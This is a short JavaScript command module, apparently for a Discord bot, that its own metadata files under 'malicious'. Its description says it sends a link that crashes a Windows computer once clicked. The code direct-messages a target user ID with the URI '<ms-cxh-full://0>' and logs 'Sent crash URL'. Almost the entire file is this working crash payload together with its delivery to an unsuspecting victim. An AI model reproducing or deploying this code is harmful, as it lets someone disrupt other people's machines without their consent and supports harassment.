module.exports = {
    name: "crash",
    description: "Sends a link to a user that crash a windows computer once clicked.",
    usage: 'crash [userId]',
    category: 'malicious',
    execute: async (client, args) => {
        if(args.length < 1)
            throw new Error("Invalid usage");

        try {
            let channel = await client.getDMChannel(args[0]);
            await client.createMessage(channel.id, "<ms-cxh-full://0>");

            return client.logger.log("Sent crash URL");
        } catch (e) {
            return client.logger.error("This user doesn't exist or is not allowing private messages.");
        }
    }
}